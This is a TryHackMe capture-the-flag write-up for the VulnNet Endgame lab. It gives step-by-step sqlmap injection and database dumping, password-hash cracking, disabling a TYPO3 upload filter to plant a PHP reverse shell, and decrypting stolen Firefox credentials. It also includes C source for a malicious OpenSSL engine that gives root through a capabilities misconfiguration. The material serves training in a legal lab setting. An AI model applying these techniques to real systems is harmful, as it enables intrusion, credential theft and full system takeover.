---
title: "VulnNet Endgame - TryHackMe Writeup"
date: 2026-07-30
draft: false
summary: "Writeup for VulnNet Endgame CTF challenge on TryHackMe."
tags: ["windows", "cms", "rce", "sql injection", "hash crack"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/vulnnet-endgame/cover.webp"
  caption: "VulnNet Endgame TryHackMe Challenge"
  alt: "VulnNet Endgame cover"
platform: "TryHackMe"
author: "Moiz Bootwala"
---


To access the machine, click on the link given below:
- https://tryhackme.com/room/vulnnetendgame
<!--more-->
Hack your way into this simulated vulnerable infrastructure. No puzzles. Enumeration is the key.

## Reconnaissance

I performed an nmap aggressive scan on the target to identify open ports and the services running on it:

```
nmap -A -p- TARGET --min-rate 10000 -oN vulnnet-endgame.nmap
```

![nmap scan on vulnnet:endgame machine](https://cdn.ziomsec.com/vulnnet-endgame/1.webp)

| **Port** | **Service** |
| -------- | ----------- |
| 22       | SSH         |
| 80       | HTTP        |

## Initial Access

After identifying that the target was running an HTTP and SSH service, I proceeded to enumerate the HTTP server. Hence I accessed the webapp and found the domain I had to bind the IP to for it to render:

![accessing the web application](https://cdn.ziomsec.com/vulnnet-endgame/2.webp)

I mapped the target IP to `vulnnnet.thm` domain in my `hosts` file and refreshed this page.

![refreshing the web page](https://cdn.ziomsec.com/vulnnet-endgame/3.webp)

### Enumeration

Since the homepage of the web application did not reveal much, I fuzzed for hidden files and directories using **ffuf**

```
ffuf -u http://vulnnet.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -fc 403
```

![fuzzing hidden files](https://cdn.ziomsec.com/vulnnet-endgame/4.webp)

```
ffuf -u http://vulnnet.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 403 -t 100
```

![fuzzing hidden directories](https://cdn.ziomsec.com/vulnnet-endgame/5.webp)

The `sass` directory seemed interesting, however, further enumeration against it revealed nothing so I moved on to subdomain enumeration.

```
ffuf -u http://vulnnet.thm -H "Host: FUZZ.vulnnet.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 9
```

![enumerating subdomains](https://cdn.ziomsec.com/vulnnet-endgame/6.webp)

This revealed a bunch of subdomains. So, I mapped these subdomains to the IP in my `hosts` file.

![mapping subdomains to target IP](https://cdn.ziomsec.com/vulnnet-endgame/7.webp)

I then accessed the `admin1` subdomain but didn't find anything interesting at first.

![accessing admin1 subdomain](https://cdn.ziomsec.com/vulnnet-endgame/8.webp)

Hence I fuzzed for other directories on this subdomain using **ffuf**

```
ffuf -u http://admin1.vulnnet.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 403
```

![enumerating hidden directories on the admin1 subdomain](https://cdn.ziomsec.com/vulnnet-endgame/9.webp)

I then accessed these endpoints and found a login panel on `typo3` and directory listings on `fileadmin` and `typo3conf`

![accessing TYPO3 login panel](https://cdn.ziomsec.com/vulnnet-endgame/10.webp)

![accessing directory listing on typo3conf](https://cdn.ziomsec.com/vulnnet-endgame/11.webp)

![accessing directory listing on fileadmin](https://cdn.ziomsec.com/vulnnet-endgame/12.webp)

Since these directories revealed nothing interesting, I moved on to the next subdomain: `blog.vulnnet.thm`

![accessing the blog subdomain](https://cdn.ziomsec.com/vulnnet-endgame/13.webp)

Reading the source to one of the blogs revealed an API endpoint

![discovering an API endpoint in a blog page source](https://cdn.ziomsec.com/vulnnet-endgame/14.webp)

I accessed the endpoint and got JSON data in return. 

![accessing the API endpoint](https://cdn.ziomsec.com/vulnnet-endgame/15.webp)

The data seemed to be retrieved based on the `request_id` parameter. So I forwarded this request to Burp's Repeater tab

![fetching contents for another id](https://cdn.ziomsec.com/vulnnet-endgame/16.webp)

When I changed the value of `blog` to an unrealistic number and appended the query with a TRUE condition, I was able to retrieve a valid blog (the first one) - this proved the presence of an SQLi vulnerability.

![testing for SQLi](https://cdn.ziomsec.com/vulnnet-endgame/17.webp)

### Exploiting SQLi

Hence I added a marker for **sqlmap** and saved this request in a file called `sql.req`

```
GET /vn_internals/api/v2/fetch/?blog=1* HTTP/1.1
Host: api.vulnnet.thm
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive

```

Finally, I ran **sqlmap** and discovered the databases

```
sqlmap -r sql.req --dbs --batch
```

![dumping databases](https://cdn.ziomsec.com/vulnnet-endgame/18.webp)

2 databases were worth looking into:
- `blog`
- `vn_admin`

I then listed the tables inside the `vn_admin` database

```
sqlmap -r sql.req -D vn_admin --tables --batch
```

![dumping tables in vn_admin db](https://cdn.ziomsec.com/vulnnet-endgame/19.webp)

So, the tables worth exploring were:
- `be_users`
- `fe_users`

I then listed the tables inside the `blog` database

```
sqlmap -r sql.rep -D blog --tables --batch
```

![dumping tables in blog db](https://cdn.ziomsec.com/vulnnet-endgame/20.webp)

The `users` table could contain credentials.

Hence, there were 3 tables that could contain user credentials:

| **DB**   | **TABLE** |
| -------- | --------- |
| vn_admin | be_users  |
| vn_admin | fe_users  |
| blog     | users     |

I started of with dumping the columns of the tables from `vn_admin` database

```
sqlmap -r sql.req -D vn_admin -T be_users,fe_users --columns --batch
```

- be_users:

![dumping columns in be_users table](https://cdn.ziomsec.com/vulnnet-endgame/21.webp)

- fe_users:

![dumping columns in fe_users table](https://cdn.ziomsec.com/vulnnet-endgame/22.webp)

I then dumped columns of the users table from blog database

```
sqlmap -r sql.req -D blog -T users --columns --batch
```

![dumping columns in users table](https://cdn.ziomsec.com/vulnnet-endgame/23.webp)

Finally, I dumped the relevant columns from the target tables:

```
sqlmap -r sql.req -D vn_admin -T be_users -C admin,email,password,realName,username --dump --batch
```

![dumping values of the relevant columns from be_users table](https://cdn.ziomsec.com/vulnnet-endgame/24.webp)

> The `fe_users` table was blank.

```
sqlmap -r sql.req -D blog -T users -C id,username,password --dump --batch
```

![dumping values of the relevant columns from users table](https://cdn.ziomsec.com/vulnnet-endgame/25.webp)

### Cracking The Hash

Since the `be_users` table revealed a hash for `chris_w` user, I attempted to crack it with john. The string that was recovered with **sqlmap** was an Argon2i password hash with:
- version: 19
- memory cost: 64 MB (65536 KiB)
- Time Cost: 16 iterations
- Parallelism 2 threads
- A base64 salt + hash

I attempted to crack it with rockyou but it was taking a lot of time:

```
echo 'HASH' > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

![cracking the hash with rockyou](https://cdn.ziomsec.com/vulnnet-endgame/26.webp)

Hence, I tried looking for the user password in the credential dump that I had recovered from the `blog` database:

![looking for chris_w's password in the users credential dump](https://cdn.ziomsec.com/vulnnet-endgame/27.webp)

Since the target user's name wasn't in this file, I decided to use these passwords to crack the hash. Hence, I created a wordlist of passwords from the saved dump.

```
tail -n +2 ~/.local/share/sqlmap/output/api.vulnnet.thm/dump/blog/users.csv | cut -d',' -f3 > passwords.lst
```

![creating a passwords wordlist](https://cdn.ziomsec.com/vulnnet-endgame/28.webp)

Using this wordlist, I was able to crack the user hash

```
john --wordlist=passwords.lst hash
```

![cracking the hash with the passwords wordlist](https://cdn.ziomsec.com/vulnnet-endgame/29.webp)

### Getting A Reverse Shell

I used these credentials to log into the CMS.

![logging into the CMS](https://cdn.ziomsec.com/vulnnet-endgame/30.webp)

I searched a bit and found the following documentation about a security option in typo3 which blocked processing certain file types:
- https://docs.typo3.org/m/typo3/reference-coreapi/main/en-us/Security/GuidelinesIntegrators/GlobalTypo3Options.html#filedenypattern

If I turned this filter off, I could attempt to upload and get a reverse shell using a php reverse shell payload. Hence, i visited `Settings -> Configure Installation-Wide Options`

![configuring installation wide options](https://cdn.ziomsec.com/vulnnet-endgame/31.webp)

I removed the regex present in the `fileDenyPattern` option and saved the configuration

![removing security regex](https://cdn.ziomsec.com/vulnnet-endgame/32.webp)

Finally, I configured and uploaded a php reverse shell payload and started a netcat listener:

![uploading php reverse shell payload](https://cdn.ziomsec.com/vulnnet-endgame/33.webp)

I triggered the payload from the `/fileadmin` endpoint and got a reverse shell as `www-data`

![triggering reverse shell payload](https://cdn.ziomsec.com/vulnnet-endgame/34.webp)

![getting a reverse shell on netcat listener](https://cdn.ziomsec.com/vulnnet-endgame/35.webp)

I spawned a stable `pty` shell using python

```
export TERM=xterm
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Privilege Escalation

After getting a reverse shell, I discovered the user flag in the `system` user's home directory but I did not have permissions to access it.

![attempting to read the user flag](https://cdn.ziomsec.com/vulnnet-endgame/36.webp)

### Shell As System

There was a `.mozilla` directory which could contain browser stored credentials. So I transferred this directory to my personal system for further analysis

```
which zip
zip -r /tmp/mozilla.zip .mozilla/
```

![compressing the mozilla directory](https://cdn.ziomsec.com/vulnnet-endgame/37.webp)

I downloaded the file on my local system and found 3 browser profiles in it. To get the passwords from these profiles, I used the following tool:
- https://github.com/unode/firefox_decrypt/

However, when I ran this tool against the download profiles, I only got options to select 2 out of the 3 profiles:

![running firefox_decrypt against firefox profiles](https://cdn.ziomsec.com/vulnnet-endgame/38.webp)

I read the `profiles.ini` file and found that the third profile was missing in it. So I added the following to `profiles.ini` before `[Profile1]`:

```
[Profile2]
Name=Secret
IsRelative=1
Path=2fjnrwth.default-release
```

Finally, I got an option to decrypt passwords from the third profile and found the credentials:

```
python3 ../../firefox_decrypt/firefox_decrypt.py .
```

![running firefox_decrypt against firefox profiles](https://cdn.ziomsec.com/vulnnet-endgame/39.webp)

With these credentials, I switched to `system` user and captured the user flag:

```
su system
cat user.txt
```

![switching to system](https://cdn.ziomsec.com/vulnnet-endgame/40.webp)

![reading the user flag](https://cdn.ziomsec.com/vulnnet-endgame/41.webp)

### Shell As Root

Since there was a `.sudo_as_admin_successful` file, I checked my sudo privileges but didn't find anything:

```
sudo -l
```

![listing sudo privs](https://cdn.ziomsec.com/vulnnet-endgame/42.webp)

The `Utils` directory seemed interesting. I found 3 binaries in it out of which the `openssl` binary had all capabilities.

```
getcap -r 2>/dev/null
```

![listing capabilities and inspecting the Utils directory](https://cdn.ziomsec.com/vulnnet-endgame/43.webp)

In Linux, `/home/system/Utils/openssl =ep` means the `openssl` executable at that path has been granted **all Linux capabilities** with SUID-like permissions. Because it bypasses normal permission checks, it effectively grants full administrative (`root`) access to anyone who runs it

There were a bunch of references online to exploit this capability:
- https://int0x33.medium.com/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099
- https://exploitnotes.org/exploit/linux/privilege-escalation/openssl#1-get-capabilities

Hence, on my local system, I installed the packages required for this exploit:

```
apt install libssl-dev
```

I then added the following code in a `.c` file and compiled it with `gcc`

```
#include <unistd.h>
#include <stdlib.h>
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id) {
    setuid(0); setgid(0);
    system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

- compile and assemble, but do not link:

```
gcc -fPIC -o exploit.o -c exploit.c
```

- create a shared library:

```
gcc -shared -o exploit.so -lcrypto exploit.o
```

![compiling the privesc payload](https://cdn.ziomsec.com/vulnnet-endgame/44.webp)

I then transferred the `exploit.so` to my target and used it gain shell as root:

```
/home/system/Utils/openssl req -engine ./exploit.so
```

![downloading and running the exploit to get root shell](https://cdn.ziomsec.com/vulnnet-endgame/45.webp)

Finally, I captured the root flag

![reading the root flag](https://cdn.ziomsec.com/vulnnet-endgame/46.webp)

---

That concludes my writeup for **VulnNet:Endgame** CTF challenge.

---
